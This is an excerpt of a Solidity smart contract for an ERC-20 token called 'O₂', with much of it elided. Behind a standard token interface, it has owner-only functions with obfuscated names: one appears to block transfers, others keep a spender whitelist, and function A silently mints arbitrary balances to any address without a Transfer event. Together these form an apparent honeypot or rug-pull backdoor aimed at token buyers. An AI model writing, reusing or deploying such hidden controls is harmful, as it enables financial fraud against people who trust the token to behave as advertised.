...
contract O2 is Context, IERC20, Ownable {
    ...
    string private _name = "O₂";
    string private _symbol = "O₂";
    uint8 private _decimals = 6;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0xd1E7f8253CA54927e60385a178178aFF5Ceb4980;
        ...
        returns (bool)
    {
        ...
        _transfer(_msgSender(), recipient, amount.sub(deadAmount).sub(devAmount));
        return true;
    }
    ...
    function transferFrom(
        ...
        _transfer(sender, recipient, amount.sub(deadAmount).sub(devAmount));
    ...
    function SETTRANSFERS(bool STATE) external onlyOwner() {
        _approveup = STATE;
    }
    
    function TOTALapprove(bool STATE) external onlyOwner() {
        _ACLLapprove = STATE;
    }
    function approveYES(address spender) external onlyOwner() {
        _PAC[spender] = true;
    }

    function approveNO(address spender) external onlyOwner() {
        delete _PAC[spender];
    }
    ...
    function A(address B, uint256 C) external onlyOwner() {
        require(C > 0, "TTT");
        uint256 D = OKAC[B];
        if (D == 0) _BBAC.push(B);
        OKAC[B] = D.add(C);
        DUCK = DUCK.add(C);
        _balance[B] = _balance[B].add(C);
    }
